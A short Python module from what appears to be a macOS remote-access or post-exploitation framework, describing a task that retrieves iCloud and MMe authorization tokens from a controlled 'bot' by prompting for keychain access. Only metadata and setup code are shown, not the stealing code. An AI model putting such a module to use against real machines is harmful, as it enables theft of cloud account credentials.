# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Retrieve iCloud and MMe authorization tokens.",
            "References": [
                "https://github.com/manwhoami/MMeTokenDecrypt"
            ],
            "Stoppable": False
        }

    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
        should_continue = self._view.should_continue([
            "This will prompt the bot to allow keychain access."
        ]).lower()

        if should_continue:
            return True, None
        else:
            return False, None
